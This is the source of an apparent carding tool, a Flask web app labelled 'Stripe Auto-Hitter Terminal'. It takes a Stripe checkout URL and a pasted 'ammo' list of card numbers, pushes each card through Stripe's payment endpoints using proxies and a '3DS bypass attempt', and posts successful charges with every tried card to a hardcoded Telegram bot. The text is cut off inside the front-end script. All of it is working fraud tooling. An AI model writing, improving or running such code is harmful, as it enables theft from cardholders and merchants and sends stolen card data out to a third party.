from flask import Flask, render_template_string, request, jsonify
import asyncio
import aiohttp
import base64
import re
import os
import time
import random
import requests
from urllib.parse import unquote

app = Flask(__name__)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8036253403:AAGuLvepZDGiUcOsKj9dbvEtkfGCWJy_RlA")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "8233015284")

AUTOHITTER_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
}

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s"\'<>)]+',
        r'https?://checkout\.stripe\.com/[^\s"\'<>)]+',
        r'https?://buy\.stripe\.com/[^\s"\'<>)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip('.,;:')
    return None


def decode_pk_from_url(url):
    result = {"pk": None, "cs": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            try:
                decoded_bytes = base64.b64decode(hash_decoded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
            except Exception:
                pass
    except Exception:
        pass
    return result


def parse_card(text):
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}


def get_bin_info(cc):
    try:
        bin_number = cc.split('|')[0][:6]
        resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "bin": bin_number,
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "bank": data.get("bank", "N/A"),
                "country": data.get("country_name", "N/A"),
                "country_flag": data.get("country_flag", ""),
            }
    except Exception:
        pass
    return None


def send_telegram(cc, merchant, amount, email, checkout_url, bin_info, tried_cards):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        bin  = bin_info or {}
        bin_line     = f"{bin.get('brand','N/A')} - {bin.get('type','N/A')} - {bin.get('level','N/A')}"
        bank_line    = bin.get("bank", "N/A")
        country_line = f"{bin.get('country','N/A')} {bin.get('country_flag','')}".strip()
        tried_list   = "\n".join(f"• {c}" for c in tried_cards) if tried_cards else "N/A"

        message = "\n".join([
            "━━━━━━━━━━━━━━━",
            "💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠",
            "━━━━━━━━━━━━━━━",
            "",
            f"💳 𝐂𝐚𝐫𝐝   : {cc}",
            f"🔥 𝐒𝐭𝐚𝐭𝐮𝐬  : Paid",
            f"💰 𝐀𝐦𝐨𝐮𝐧𝐭  : {amount}",
            f"🌐 𝐒𝐢𝐭𝐞    : {merchant}",
            f"📩 𝐌𝐚𝐢𝐥   : {email}",
            "",
            f"📦 𝐈𝐧𝐟𝐨   : {bin_line}",
            f"🏦 𝐁𝐚𝐧𝐤   : {bank_line}",
            f"🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 : {country_line}",
            "",
            "🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦  :",
            checkout_url,
            "",
            "🙏 Thank you!",
            "━━━━━━━━━━━━━━━",
            "👤 𝐃𝐞𝐯    : @Pyftp",
            "━━━━━━━━━━━━━━━",
            f"📋 𝐀𝐥𝐥 𝐓𝐫𝐢𝐞𝐝 𝐂𝐚𝐫𝐝𝐬 ({len(tried_cards)}):",
            tried_list,
        ])
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "disable_web_page_preview": True},
            timeout=10,
        )
    except Exception:
        pass

# ─── ASYNC STRIPE LOGIC ───────────────────────────────────────────────────────

async def get_checkout_info_async(url):
    result = {"pk": None, "cs": None, "merchant": None, "email": None,
              "price": None, "currency": None, "error": None,
              "init_checksum": None, "total": None, "subtotal": None,
              "billing_name": "John Smith", "billing_country": "US",
              "billing_line1": "476 West White Mountain Blvd",
              "billing_city": "Pinetop", "billing_state": "AZ",
              "billing_zip": "85929", "checkout_url": url}
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")

        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            return result

        pk, cs = result["pk"], result["cs"]
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"

        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                headers=AUTOHITTER_HEADERS, data=body
            ) as r:
                init_data = await r.json()

        if "error" in init_data:
            result["error"] = init_data["error"].get("message", "Init failed")
            return result

        acc = init_data.get("account_settings", {})
        result["merchant"] = acc.get("display_name") or acc.get("business_name")

        cust = init_data.get("customer") or {}
        addr = cust.get("address") or {}
        result["email"] = init_data.get("customer_email") or cust.get("email")
        result["init_checksum"] = init_data.get("init_checksum")

        if cust.get("name"):
            result["billing_name"] = cust["name"]
        if addr.get("country"):  result["billing_country"] = addr["country"]
        if addr.get("line1"):    result["billing_line1"]   = addr["line1"]
        if addr.get("city"):     result["billing_city"]    = addr["city"]
        if addr.get("state"):    result["billing_state"]   = addr["state"]
        if addr.get("postal_code"): result["billing_zip"]  = addr["postal_code"]

        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        pi  = init_data.get("payment_intent") or {}

        if lig:
            result["total"]    = lig.get("total", 0)
            result["subtotal"] = lig.get("subtotal", result["total"])
            result["price"]    = result["total"] / 100
            result["currency"] = (lig.get("currency") or "").upper()
        elif inv:
            result["total"]    = inv.get("total", 0)
            result["subtotal"] = inv.get("subtotal", result["total"])
            result["price"]    = result["total"] / 100
            result["currency"] = (inv.get("currency") or "").upper()
        elif pi:
            result["total"] = result["subtotal"] = pi.get("amount", 0)
            result["price"] = result["total"] / 100

    except Exception as e:
        result["error"] = str(e)
    return result


async def charge_card_async(card, checkout_data, proxy=None):
    start = time.perf_counter()
    cc_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    result = {"card": cc_str, "status": None, "response": None, "time": 0}

    pk       = checkout_data.get("pk")
    cs       = checkout_data.get("cs")
    email    = checkout_data.get("email") or "john@example.com"
    checksum = checkout_data.get("init_checksum") or ""
    total    = checkout_data.get("total") or 0
    subtotal = checkout_data.get("subtotal") or total
    name     = checkout_data.get("billing_name") or "John Smith"
    country  = checkout_data.get("billing_country") or "US"
    line1    = checkout_data.get("billing_line1") or "476 West White Mountain Blvd"
    city     = checkout_data.get("billing_city") or "Pinetop"
    state    = checkout_data.get("billing_state") or "AZ"
    zip_code = checkout_data.get("billing_zip") or "85929"

    if not pk or not cs:
        result["status"]   = "FAILED"
        result["response"] = "No checkout data"
        result["time"]     = round(time.perf_counter() - start, 2)
        return result

    def elapsed():
        return round(time.perf_counter() - start, 2)

    try:
        async with aiohttp.ClientSession() as s:
            # 1) Tokenise card
            token_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": AUTOHITTER_HEADERS["user-agent"],
            }
            token_body = (
                f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
                f"&card[name]={name}&card[address_country]={country}"
                f"&card[address_line1]={line1}&card[address_city]={city}"
                f"&card[address_state]={state}&card[address_zip]={zip_code}"
                f"&key={pk}&pasted_fields=number"
                f"&payment_user_agent=stripe.js%2Fb3f6c00c8a%3B+stripe-js-v3%2Fb3f6c00c8a%3B+checkout"
                f"&referrer=https%3A%2F%2Fcheckout.stripe.com&time_on_page=32567"
            )
            async with s.post("https://api.stripe.com/v1/tokens",
                              headers=token_headers, data=token_body) as r:
                tok = await r.json()

            if "error" in tok:
                result["status"]   = "DECLINED"
                result["response"] = tok["error"].get("message", "Card error")
                result["time"]     = elapsed()
                return result

            token_id = tok.get("id")
            if not token_id:
                result["status"] = "FAILED"; result["response"] = "No Token"
                result["time"]   = elapsed(); return result

            # 2) Create payment method
            pm_body = (
                f"type=card&card[token]={token_id}"
                f"&billing_details[name]={name}&billing_details[email]={email}"
                f"&billing_details[address][country]={country}"
                f"&billing_details[address][line1]={line1}"
                f"&billing_details[address][city]={city}"
                f"&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}&key={pk}"
            )
            async with s.post("https://api.stripe.com/v1/payment_methods",
                              headers=AUTOHITTER_HEADERS, data=pm_body) as r:
                pm = await r.json()

            if "error" in pm:
                result["status"]   = "DECLINED"
                result["response"] = pm["error"].get("message", "Card error")
                result["time"]     = elapsed()
                return result

            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"; result["response"] = "No PM"
                result["time"]   = elapsed(); return result

            # 3) Confirm checkout
            conf_params = (
                f"eid=NA&payment_method={pm_id}"
                f"&expected_amount={total}"
                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={pk}"
            )
            if checksum:
                conf_params += f"&init_checksum={checksum}"

            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                headers=AUTOHITTER_HEADERS, data=conf_params
            ) as r:
                conf = await r.json()

            if "error" in conf:
                err = conf["error"]
                dc  = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                result["status"]   = "DECLINED"
                result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                result["time"]     = elapsed()
                return result

            pi   = conf.get("payment_intent") or {}
            st   = pi.get("status") or conf.get("status") or ""
            pi_id = pi.get("id")
            pi_cs = pi.get("client_secret")

            if st == "succeeded":
                result["status"] = "CHARGED"; result["response"] = "Payment Successful"
                result["time"]   = elapsed(); return result

            # 4) 3DS bypass attempt
            if st == "requires_action" and pi_id and pi_cs:
                bypass_body = (
                    f"payment_method={pm_id}&expected_payment_method_type=card"
                    f"&use_stripe_sdk=true&key={pk}&client_secret={pi_cs}"
                )
                async with s.post(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                    headers=AUTOHITTER_HEADERS, data=bypass_body
                ) as r2:
                    bypass_resp = await r2.json()

                if "error" not in bypass_resp:
                    bypass_st = bypass_resp.get("status", "")
                    if bypass_st == "succeeded":
                        result["status"]   = "CHARGED"
                        result["response"] = "3DS Bypassed - Payment Successful"
                        result["time"]     = elapsed(); return result
                    if bypass_st == "requires_action":
                        na       = bypass_resp.get("next_action") or {}
                        redirect = na.get("redirect_to_url") or {}
                        rurl     = redirect.get("url", "")
                        if rurl:
                            try:
                                async with s.get(rurl, allow_redirects=True): pass
                                async with s.post(
                                    f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                                    headers=AUTOHITTER_HEADERS,
                                    data=f"key={pk}&client_secret={pi_cs}"
                                ) as r4:
                                    final = await r4.json()
                                if final.get("status") == "succeeded":
                                    result["status"]   = "CHARGED"
                                    result["response"] = "3DS Bypassed - Payment Successful"
                                    result["time"]     = elapsed(); return result
                            except Exception:
                                pass
                        result["status"]   = "3DS"
                        result["response"] = "3DS Required - Manual Auth Needed"
                        result["time"]     = elapsed(); return result
                    result["status"]   = "3DS"
                    result["response"] = f"3DS: {bypass_st}"
                    result["time"]     = elapsed(); return result
                result["status"] = "3DS"; result["response"] = "3DS Required"
                result["time"]   = elapsed(); return result

            if st == "requires_action":
                result["status"] = "3DS"; result["response"] = "3DS Required"
                result["time"]   = elapsed(); return result
            if st == "requires_payment_method":
                result["status"] = "DECLINED"; result["response"] = "Card Declined"
                result["time"]   = elapsed(); return result

            result["status"]   = "UNKNOWN"
            result["response"] = st or "Unknown"
            result["time"]     = elapsed()
            return result

    except Exception as e:
        result["status"]   = "ERROR"
        result["response"] = str(e)[:80]
        result["time"]     = elapsed()
        return result

# ─── ROUTES ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route("/autohitter/init", methods=["POST"])
def autohitter_init():
    data = request.get_json()
    raw_url = data.get("checkout_url", "")
    url = extract_checkout_url(raw_url) or raw_url

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(get_checkout_info_async(url))
    finally:
        loop.close()
    return jsonify(result)


@app.route("/autohitter/charge", methods=["POST"])
def autohitter_charge():
    data          = request.get_json()
    cc_raw        = data.get("cc", "")
    checkout_data = data.get("checkout_data", {})
    proxies       = data.get("proxies", [])
    tried_cards   = data.get("tried_cards", [])

    card = parse_card(cc_raw)
    if not card:
        return jsonify({"card": cc_raw, "status": "INVALID",
                        "response": "Invalid card format", "time": 0, "bin_info": None})

    proxy = random.choice(proxies) if proxies else None

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(charge_card_async(card, checkout_data, proxy))
    finally:
        loop.close()

    bin_info = get_bin_info(cc_raw)
    result["bin_info"] = bin_info

    if result["status"] == "CHARGED":
        currency = checkout_data.get("currency") or "USD"
        price    = checkout_data.get("price") or 0
        send_telegram(
            cc        = result["card"],
            merchant  = checkout_data.get("merchant") or "Unknown",
            amount    = f"{currency} {float(price):.2f}",
            email     = checkout_data.get("email") or "N/A",
            checkout_url = checkout_data.get("checkout_url") or "",
            bin_info  = bin_info,
            tried_cards = tried_cards,
        )

    return jsonify(result)

# ─── HTML FRONTEND ────────────────────────────────────────────────────────────

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UNOOC-2026</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💠</text></svg>">
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --bg:        #0b0e1a;
      --bg2:       #111520;
      --bg3:       #181d2e;
      --border:    rgba(99,130,190,0.18);
      --border-hi: rgba(99,130,190,0.38);
      --primary:   #3b7cf4;
      --primary-h: #5592ff;
      --text:      #c8d4ec;
      --muted:     #6b7a9a;
      --green:     #4ade80;
      --red:       #f87171;
      --orange:    #fb923c;
      --mono:      'Space Mono', monospace;
      --sans:      'Inter', sans-serif;
    }
    html, body { height: 100%; background: var(--bg); color: var(--text); font-family: var(--sans); }
    a { color: var(--primary); }
    /* ── Layout ── */
    .app { max-width: 1280px; margin: 0 auto; padding: 20px 16px 40px; display: flex; flex-direction: column; gap: 20px; }
    /* ── Header ── */
    .header { display: flex; align-items: center; gap: 12px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
    .header-logo { color: var(--primary); font-size: 22px; font-family: var(--mono); font-weight: 700; letter-spacing: 2px; }
    .header-logo span { color: var(--muted); }
    .header-sub { margin-left: auto; font-size: 11px; letter-spacing: 2px; color: var(--muted); font-family: var(--mono); }
    /* ── Grid ── */
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
    @media (max-width: 860px) { .grid-2 { grid-template-columns: 1fr; } }
    /* ── Card ── */
    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; }
    .card:hover { border-color: var(--border-hi); }
    .card-head { padding: 14px 18px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
    .card-title { font-size: 11px; font-weight: 700; letter-spacing: 2px; color: var(--muted); font-family: var(--mono); display: flex; align-items: center; gap: 8px; }
    .card-title .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--primary); display: inline-block; }
    .card-body { padding: 18px; display: flex; flex-direction: column; gap: 14px; }
    /* ── Form ── */
    label { font-size: 10px; font-weight: 700; letter-spacing: 1.5px; color: var(--muted); font-family: var(--mono); text-transform: uppercase; display: block; margin-bottom: 6px; }
    input, textarea { width: 100%; background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 13px; font-family: var(--mono); padding: 10px 14px; outline: none; transition: border-color .2s; resize: vertical; }
    input:focus, textarea:focus { border-color: var(--primary); }
    input::placeholder, textarea::placeholder { color: var(--muted); }
    textarea { min-height: 80px; }
    .input-row { display: flex; gap: 10px; }
    .input-row input { flex: 1; }
    /* ── Buttons ── */
    .btn { padding: 10px 22px; border: none; border-radius: 8px; font-size: 12px; font-weight: 700; letter-spacing: 1.5px; font-family: var(--mono); cursor: pointer; transition: background .15s, transform .1s; text-transform: uppercase; display: inline-flex; align-items: center; gap: 8px; }
    .btn:active { transform: scale(0.97); }
    .btn-primary { background: var(--primary); color: #fff; }
    .btn-primary:hover { background: var(--primary-h); }
    .btn-primary:disabled { background: #1e2a44; color: var(--muted); cursor: not-allowed; }
    .btn-danger  { background: #4a1010; color: var(--red); border: 1px solid rgba(248,113,113,.3); }
    .btn-danger:hover  { background: #5c1515; }
    .btn-ghost   { background: transparent; color: var(--muted); border: 1px solid var(--border); }
    .btn-ghost:hover   { color: var(--text); border-color: var(--border-hi); }
    .btn-sm { padding: 6px 12px; font-size: 10px; border-radius: 6px; }
    .btn-full { width: 100%; justify-content: center; }
    /* ── Info panel ── */
    .info-panel { background: var(--bg3); border: 1px solid var(--border); border-left: 3px solid var(--primary); border-radius: 8px; padding: 14px; display: none; }
    .info-panel.show { display: block; }
    .info-grid { display: grid; grid-template-columns: 100px 1fr; row-gap: 7px; font-size: 12px; }
    .info-label { color: var(--muted); font-family: var(--mono); }
    .info-value { color: var(--text); font-family: var(--mono); font-weight: 700; word-break: break-all; }
    /* ── Progress ── */
    .progress-wrap { display: none; }
    .progress-wrap.show { display: block; }
    .progress-track { height: 6px; background: var(--bg3); border-radius: 3px; overflow: hidden; margin-top: 10px; }
    .progress-fill { height: 100%; background: var(--primary); border-radius: 3px; transition: width .3s; width: 0%; }
    .progress-label { font-size: 11px; font-family: var(--mono); color: var(--muted); margin-top: 6px; text-align: center; }
    /* ── Results ── */
    .results-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
    @media (max-width: 860px) { .results-grid { grid-template-columns: 1fr; } }
    .result-col { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; display: flex; flex-direction: column; min-height: 380px; overflow: hidden; }
    .result-col.charged  { border-color: rgba(74,222,128,.18); }
    .result-col.declined { border-color: rgba(248,113,113,.18); }
    .col-head { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,.15); }
    .col-head.charged  { background: rgba(74,222,128,.04); }
    .col-head.declined { background: rgba(248,113,113,.04); }
    .col-title { font-size: 11px; font-weight: 700; letter-spacing: 2px; font-family: var(--mono); flex: 1; }
    .col-title.charged  { color: var(--green); }
    .col-title.declined { color: var(--red); }
    .col-count { font-size: 11px; font-family: var(--mono); padding: 3px 10px; background: var(--bg3); border: 1px solid var(--border); border-radius: 20px; color: var(--text); }
    .col-scroll { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 10px; }
    .col-scroll::-webkit-scrollbar { width: 5px; }
    .col-scroll::-webkit-scrollbar-track { background: transparent; }
    .col-scroll::-webkit-scrollbar-thumb { background: #1e2a44; border-radius: 3px; }
    /* ── Result cards ── */
    .res-card { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 12px; font-size: 12px; font-family: var(--mono); position: relative; }
    .res-card.charged  { border-left: 3px solid var(--green); }
    .res-card.declined { border-left: 3px solid var(--red); }
    .res-card.is3ds    { border-left: 3px solid var(--orange); }
    .res-cc { font-weight: 700; color: var(--text); margin-bottom: 8px; padding-right: 50px; word-break: break-all; }
    .res-response { color: var(--muted); font-size: 11px; margin-top: 6px; }
    .res-response.charged  { color: var(--green); }
    .res-response.is3ds    { color: var(--orange); }
    .res-time { color: var(--muted); font-size: 10px; margin-top: 4px; }
    .bin-badges { display: flex; flex-wrap: wrap; gap: 5px; margin: 6px 0; }
    .bin-badge { font-size: 9px; font-weight: 700; letter-spacing: 1px; padding: 2px 7px; border-radius: 3px; background: rgba(99,130,190,.12); color: #8090b8; border: 1px solid rgba(99,130,190,.2); text-transform: uppercase; }
    .bin-bank { font-size: 10px; color: var(--muted); margin-top: 2px; }
    .btn-copy-card { position: absolute; top: 8px; right: 8px; background: none; border: none; color: var(--muted); cursor: pointer; padding: 4px 8px; font-size: 10px; font-family: var(--mono); border-radius: 4px; }
    .btn-copy-card:hover { background: rgba(99,130,190,.1); color: var(--text); }
    /* ── Success block ── */
    .success-block { margin-top: 10px; padding: 10px; background: rgba(74,222,128,.05); border: 1px solid rgba(74,222,128,.15); border-radius: 6px; font-size: 11px; line-height: 1.8; white-space: pre-wrap; color: var(--green); }
    /* ── Empty state ── */
    .empty { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--muted); font-size: 12px; font-family: var(--mono); gap: 10px; padding: 30px; text-align: center; }
    .empty svg { opacity: .2; }
    /* ── Btn row ── */
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
  </style>
</head>
<body>
<div class="app">

  <!-- Header -->
  <div class="header">
    <div class="header-logo"><span>&gt;_</span> UNOOC-2026</div>
    <div class="header-sub">STRIPE AUTO-HITTER TERMINAL</div>
  </div>

  <!-- Top: Config + Ammo -->
  <div class="grid-2">

    <!-- Target Config -->
    <div class="card">
      <div class="card-head">
        <div class="card-title"><span class="dot"></span> Target Configuration</div>
      </div>
      <div class="card-body">
        <div>
          <label>Checkout URL</label>
          <div class="input-row">
            <input id="checkoutUrl" type="text" placeholder="https://checkout.stripe.com/c/pay/cs_live_...">
            <button class="btn btn-primary" id="loadBtn" onclick="loadCheckout()">Load</button>
          </div>
        </div>

        <div>
          <label>Proxies (optional, 1 per line)</label>
          <textarea id="proxyInput" placeholder="http://user:pass@ip:port" style="min-height:65px;"></textarea>
        </div>

        <div class="info-panel" id="checkoutInfo">
          <div class="info-grid">
            <div class="info-label">Merchant</div><div class="info-value" id="iMerchant">-</div>
            <div class="info-label">Email</div>   <div class="info-value" id="iEmail">-</div>
            <div class="info-label">Amount</div>  <div class="info-value" id="iPrice">-</div>
            <div class="info-label">PK</div>      <div class="info-value" id="iPk">-</div>
            <div class="info-label">CS</div>      <div class="info-value" id="iCs">-</div>
          </div>
        </div>
      </div>
    </div>

    <!-- Ammo / CC List -->
    <div class="card">
      <div class="card-head">
        <div class="card-title"><span class="dot"></span> Ammo / CC List</div>
      </div>
      <div class="card-body" style="flex:1;">
        <div style="flex:1;">
          <label>Cards (CC|MM|YY|CVV, one per line)</label>
          <textarea id="ccInput" placeholder="4111111111111111|12|26|123&#10;5500000000000004|06|27|321" style="min-height:130px;"></textarea>
        </div>

        <div class="btn-row">
          <button class="btn btn-primary" id="startBtn" onclick="startAutoHit()" style="flex:1;">▶ Start Auto Hit</button>
          <button class="btn btn-danger"  id="stopBtn"  onclick="stopAutoHit()"  style="display:none;flex:1;">■ Stop</button>
          <button class="btn btn-ghost btn-sm" onclick="clearLogs()">Clear</button>
        </div>

        <div class="progress-wrap" id="progressWrap">
          <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
          <div class="progress-label" id="progressLabel">0 / 0</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Results -->
  <div class="results-grid">

    <!-- Charged -->
    <div class="result-col charged">
      <div class="col-head charged">
        <div class="col-title charged">✓ Charged</div>
        <span class="col-count" id="chargedCount">0</span>
        <button class="btn btn-ghost btn-sm" onclick="copyAll('charged')" style="margin-left:8px;">Copy All</button>
      </div>
      <div class="col-scroll" id="chargedCards">
        <div class="empty">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          No charged cards yet
        </div>
      </div>
    </div>

    <!-- Declined / 3DS -->
    <div class="result-col declined">
      <div class="col-head declined">
        <div class="col-title declined">✗ Declined / 3DS</div>
        <span class="col-count" id="declinedCount">0</span>
        <button class="btn btn-ghost btn-sm" onclick="copyAll('declined')" style="margin-left:8px;">Copy All</button>
      </div>
      <div class="col-scroll" id="declinedCards">
        <div class="empty">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          No declined cards yet
        </div>
      </div>
    </div>
  </div>

</div>

<script>
  let ahCheckoutData = null;
  let ahRunning = false;
  let chargedList = [];
  let declinedList = [];

  function esc(t) {
    const d = document.createElement('div');
    d.textContent = t;
    return d.innerHTML;
  }

  // ── Load checkout ──────────────────────────────────────────────────────────
  async function loadCheckout() {
    const url = document.getElementById('checkoutUrl').value.trim();
    if (!url) return alert('Enter a checkout URL');
    const btn = document.getElementById('loadBtn');
    btn.disabled = true; btn.textContent = 'Loading...';
    try {
      const r = await fetch('/autohitter/init', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({checkout_url: url})
      });
      const data = await r.json();
      if (data.error) { alert('Error: ' + data.error); return; }
      ahCheckoutData = {...data, checkout_url: url};
      document.getElementById('iMerchant').textContent = data.merchant || 'Unknown';
      document.getElementById('iEmail').textContent    = data.email    || 'N/A';
      document.getElementById('iPrice').textContent    = data.price
        ? `${data.currency} ${parseFloat(data.price).toFixed(2)}`
        : 'N/A';
      document.getElementById('iPk').textContent = data.pk ? data.pk.slice(0,20) + '...' : 'N/A';
      document.getElementById('iCs').textContent = data.cs ? data.cs.slice(0,20) + '...' : 'N/A';
      document.getElementById('checkoutInfo').classList.add('show');
    } catch(e) { alert('Failed: ' + e.message); }
    finally { btn.disabled = false; btn.textContent = 'Load'; }
  }

  // ── Auto Hit ───────────────────────────────────────────────────────────────
  async function startAutoHit() {
    if (!ahCheckoutData) return alert('Load checkout first');
    const input = document.getElementById('ccInput').value.trim();
    if (!input) return alert('Enter CC list');
    const lines = input.split('\\n').map(l => l.trim()).filter(l => l);
    if (!lines.length) return;

    const proxies = document.getElementById('proxyInput').value
      .split('\\n').map(p => p.trim()).filter(p => p);
    const triedCards = [];

    ahRunning = true;
    document.getElementById('startBtn').style.display = 'none';
    document.getElementById('stopBtn').style.display  = 'flex';
    document.getElementById('progressWrap').classList.add('show');

    for (let i = 0; i < lines.length; i++) {
      if (!ahRunning) break;
      const cc = lines[i];
      triedCards.push(cc);
      document.getElementById('progressFill').style.width = ((i+1)/lines.length*100) + '%';
      document.getElementById('progressLabel').textContent = `${i+1} / ${lines.length}`;
      try {
        const r = await fetch('/autohitter/charge', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({cc, checkout_data: ahCheckoutData, proxies, tried_cards: triedCards})
        });
        const data = await r.json();
        addResult(data);
      } catch(e) {
        addResult({card: cc, status: 'ERROR', response: e.message, time: 0, bin_info: null});
      }
    }
    finishRun();
  }

  function stopAutoHit() { ahRunning = false; finishRun(); }

  function finishRun() {
    ahRunning = false;
    document.getElementById('startBtn').style.display = 'flex';
    document.getElementById('stopBtn').style.display  = 'none';
    document.getElementById('progressLabel').textContent = 'Done!';
    setTimeout(() => {
      document.getElementById('progressWrap').classList.remove('show');
      document.getElementById('progressFill').style.width = '0%';
    }, 2000);
  }

  // ── Add result card ────────────────────────────────────────────────────────
  function addResult(data) {
    const isCharged = data.status === 'CHARGED';
    const is3DS     = data.status === '3DS';
    const container = document.getElementById(isCharged ? 'chargedCards' : 'declinedCards');
    const countEl   = document.getElementById(isCharged ? 'chargedCount' : 'declinedCount');
    const list      = isCharged ? chargedList : declinedList;

    const empty = container.querySelector('.empty');
    if (empty) empty.remove();

    list.unshift(data);
    countEl.textContent = list.length;

    const bin = data.bin_info || {};
    let binHtml = '';
    if (bin.brand || bin.type || bin.level || bin.country) {
      const badges = [bin.brand, bin.type, bin.level, bin.country + ' ' + (bin.country_flag || '')]
        .filter(b => b && b.trim())
        .map(b => `<span class="bin-badge">${esc(b.trim())}</span>`)
        .join('');
